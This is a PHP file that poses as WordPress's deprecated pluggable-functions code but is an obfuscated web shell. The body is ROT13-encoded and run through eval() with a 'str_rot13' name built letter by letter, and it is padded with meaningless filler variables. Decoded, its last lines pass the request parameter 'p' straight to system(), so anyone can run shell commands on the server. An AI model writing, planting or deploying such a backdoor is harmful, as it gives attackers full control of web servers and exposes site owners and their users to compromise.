<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Qrcerpngrq cyhttnoyr shapgvbaf sebz cnfg JbeqCerff irefvbaf. Lbh fubhyqa'g hfr gurfr
 * shapgvbaf naq ybbx sbe gur nygreangvirf vafgrnq. Gur shapgvbaf jvyy or erzbirq va n
 * yngre irefvba.
 *
 * Qrcerpngrq jneavatf ner nyfb guebja vs bar bs gurfr shapgvbaf vf orvat qrsvarq ol n cyhtva.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Qrcerpngrq
 * @frr cyhttnoyr.cuc
 */

/*
 * Qrcerpngrq shapgvbaf pbzr urer gb qvr.
 */

vs ( !shapgvba_rkvfgf('frg_pheerag_hfre') ) :
/**
 * Punatrf gur pheerag hfre ol VQ be anzr.
 *
 * Frg $vq gb ahyy naq fcrpvsl n anzr vs lbh qb abg xabj n hfre'f VQ.
 *
 * @fvapr 2.0.1
 * @qrcerpngrq 3.0.0 Hfr jc_frg_pheerag_hfre()
 * @frr jc_frg_pheerag_hfre()
 *
 * @cnenz vag|ahyy $vq Hfre VQ.
 * @cnenz fgevat $anzr Bcgvbany. Gur hfre'f hfreanzr
 * @erghea JC_Hfre ergheaf jc_frg_pheerag_hfre()
 */
shapgvba frg_pheerag_hfre($vq, $anzr = '') {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '3.0.0', 'jc_frg_pheerag_hfre()' );
	erghea jc_frg_pheerag_hfre($vq, $anzr);
}
raqvs;

vs ( !shapgvba_rkvfgf('trg_pheeraghfrevasb') ) :
/**
 * Cbchyngr tybony inevnoyrf jvgu vasbezngvba nobhg gur pheeragyl ybttrq va hfre.
 *
 * @fvapr 0.71
 * @qrcerpngrq 4.5.0 Hfr jc_trg_pheerag_hfre()
 * @frr jc_trg_pheerag_hfre()
 *
 * @erghea obby|JC_Hfre Snyfr ba KZYECP Erdhrfg naq vainyvq nhgu pbbxvr, JC_Hfre vafgnapr bgurejvfr.
 */
shapgvba trg_pheeraghfrevasb() {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '4.5.0', 'jc_trg_pheerag_hfre()' );

	erghea _jc_trg_pheerag_hfre();
}
raqvs;

vs ( !shapgvba_rkvfgf('trg_hfreqngnolybtva') ) :
/**
 * Ergevrir hfre vasb ol ybtva anzr.
 *
 * @fvapr 0.71
 * @qrcerpngrq 3.3.0 Hfr trg_hfre_ol()
 * @frr trg_hfre_ol()
 *
 * @cnenz fgevat $hfre_ybtva Hfre'f hfreanzr
 * @erghea obby|bowrpg Snyfr ba snvyher, Hfre QO ebj bowrpg
 */
shapgvba trg_hfreqngnolybtva($hfre_ybtva) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '3.3.0', \"trg_hfre_ol('ybtva')\" );
	erghea trg_hfre_ol('ybtva', $hfre_ybtva);
}
raqvs;

vs ( !shapgvba_rkvfgf('trg_hfre_ol_rznvy') ) :
/**
 * Ergevrir hfre vasb ol rznvy.
 *
 * @fvapr 2.5.0
 * @qrcerpngrq 3.3.0 Hfr trg_hfre_ol()
 * @frr trg_hfre_ol()
 *
 * @cnenz fgevat $rznvy Hfre'f rznvy nqqerff
 * @erghea obby|bowrpg Snyfr ba snvyher, Hfre QO ebj bowrpg
 */
shapgvba trg_hfre_ol_rznvy($rznvy) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '3.3.0', \"trg_hfre_ol('rznvy')\" );
	erghea trg_hfre_ol('rznvy', $rznvy);
}
raqvs;

vs ( !shapgvba_rkvfgf('jc_frgpbbxvr') ) :
/**
 * Frgf n pbbxvr sbe n hfre jub whfg ybttrq va. Guvf shapgvba vf qrcerpngrq.
 *
 * @fvapr 1.5.0
 * @qrcerpngrq 2.5.0 Hfr jc_frg_nhgu_pbbxvr()
 * @frr jc_frg_nhgu_pbbxvr()
 *
 * @cnenz fgevat $hfreanzr Gur hfre'f hfreanzr
 * @cnenz fgevat $cnffjbeq Bcgvbany. Gur hfre'f cnffjbeq
 * @cnenz obby $nyernql_zq5 Bcgvbany. Jurgure gur cnffjbeq unf nyernql orra guebhtu ZQ5
 * @cnenz fgevat $ubzr Bcgvbany. Jvyy or hfrq vafgrnq bs PBBXVRCNGU vs frg
 * @cnenz fgevat $fvgrhey Bcgvbany. Jvyy or hfrq vafgrnq bs FVGRPBBXVRCNGU vs frg
 * @cnenz obby $erzrzore Bcgvbany. Erzrzore gung gur hfre vf ybttrq va
 */
shapgvba jc_frgpbbxvr(
	$hfreanzr,
	#[\FrafvgvirCnenzrgre]
	$cnffjbeq = '',
	$nyernql_zq5 = snyfr,
	$ubzr = '',
	$fvgrhey = '',
	$erzrzore = snyfr
) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '2.5.0', 'jc_frg_nhgu_pbbxvr()' );
	$hfre = trg_hfre_ol('ybtva', $hfreanzr);
	jc_frg_nhgu_pbbxvr($hfre->VQ, $erzrzore);
}
ryfr :
	_qrcerpngrq_shapgvba( 'jc_frgpbbxvr', '2.5.0', 'jc_frg_nhgu_pbbxvr()' );
raqvs;

vs ( !shapgvba_rkvfgf('jc_pyrnepbbxvr') ) :
/**
 * Pyrnef gur nhguragvpngvba pbbxvr, ybttvat gur hfre bhg. Guvf shapgvba vf qrcerpngrq.
 *
 * @fvapr 1.5.0
 * @qrcerpngrq 2.5.0 Hfr jc_pyrne_nhgu_pbbxvr()
 * @frr jc_pyrne_nhgu_pbbxvr()
 */
shapgvba jc_pyrnepbbxvr() {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '2.5.0', 'jc_pyrne_nhgu_pbbxvr()' );
	jc_pyrne_nhgu_pbbxvr();
}
ryfr :
	_qrcerpngrq_shapgvba( 'jc_pyrnepbbxvr', '2.5.0', 'jc_pyrne_nhgu_pbbxvr()' );
raqvs;

vs ( !shapgvba_rkvfgf('jc_trg_pbbxvr_ybtva') ):
/**
 * Trgf gur hfre pbbxvr ybtva. Guvf shapgvba vf qrcerpngrq.
 *
 * Guvf shapgvba vf qrcerpngrq naq fubhyq ab ybatre or rkgraqrq nf vg jba'g or
 * hfrq naljurer va JbeqCerff. Nyfb, cyhtvaf fubhyqa'g hfr vg rvgure.
 *
 * @fvapr 2.0.3
 * @qrcerpngrq 2.5.0
 *
 * @erghea obby Nyjnlf ergheaf snyfr
 */
shapgvba jc_trg_pbbxvr_ybtva() {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '2.5.0' );
	erghea snyfr;
}
ryfr :
	_qrcerpngrq_shapgvba( 'jc_trg_pbbxvr_ybtva', '2.5.0' );
raqvs;

vs ( !shapgvba_rkvfgf('jc_ybtva') ) :
/**
 * Purpxf n hfref ybtva vasbezngvba naq ybtf gurz va vs vg purpxf bhg. Guvf shapgvba vf qrcerpngrq.
 *
 * Hfr gur tybony $reebe gb trg gur ernfba jul gur ybtva snvyrq. Vs gur hfreanzr
 * vf oynax, ab reebe jvyy or frg, fb nffhzr oynax hfreanzr ba gung pnfr.
 *
 * Cyhtvaf rkgraqvat guvf shapgvba fubhyq nyfb cebivqr gur tybony $reebe naq frg
 * jung gur reebe vf, fb gung gubfr purpxvat gur tybony sbe jul gurer jnf n
 * snvyher pna hgvyvmr vg yngre.
 *
 * @fvapr 1.2.2
 * @qrcerpngrq 2.5.0 Hfr jc_fvtaba()
 * @frr jc_fvtaba()
 *
 * @tybony fgevat $reebe Reebe jura snyfr vf erghearq
 *
 * @cnenz fgevat $hfreanzr   Hfre'f hfreanzr
 * @cnenz fgevat $cnffjbeq   Hfre'f cnffjbeq
 * @cnenz fgevat $qrcerpngrq Abg hfrq
 * @erghea obby Gehr ba fhpprffshy purpx, snyfr ba ybtva snvyher.
 */
shapgvba jc_ybtva(
	$hfreanzr,
	#[\FrafvgvirCnenzrgre]
	$cnffjbeq,
	$qrcerpngrq = ''
) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '2.5.0', 'jc_fvtaba()' );
	tybony $reebe;

	$hfre = jc_nhguragvpngr($hfreanzr, $cnffjbeq);

	vs ( ! vf_jc_reebe($hfre) )
		erghea gehr;

	$reebe = $hfre->trg_reebe_zrffntr();
	erghea snyfr;
}
ryfr :
	_qrcerpngrq_shapgvba( 'jc_ybtva', '2.5.0', 'jc_fvtaba()' );
raqvs;

/**
 * JbeqCerff NgbzCho NCV vzcyrzragngvba.
 *
 * Bevtvanyyl fgberq va jc-ncc.cuc, naq yngre jc-vapyhqrf/pynff-jc-ngbz-freire.cuc.
 * Vg vf xrcg urer va pnfr n cyhtva qverpgyl ersreerq gb gur pynff.
 *
 * @fvapr 2.2.0
 * @qrcerpngrq 3.5.0
 *
 * @yvax uggcf://jbeqcerff.bet/cyhtvaf/ngbz-choyvfuvat-cebgbpby/
 */
vs ( ! pynff_rkvfgf( 'jc_ngbz_freire', snyfr ) ) {
	pynff jc_ngbz_freire {
		choyvp shapgvba __pnyy( $anzr, $nethzragf ) {
			_qrcerpngrq_shapgvba( __PYNFF__ . '::' . $anzr, '3.5.0', 'gur Ngbz Choyvfuvat Cebgbpby cyhtva' );
		}

		choyvp fgngvp shapgvba __pnyyFgngvp( $anzr, $nethzragf ) {
			_qrcerpngrq_shapgvba( __PYNFF__ . '::' . $anzr, '3.5.0', 'gur Ngbz Choyvfuvat Cebgbpby cyhtva' );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>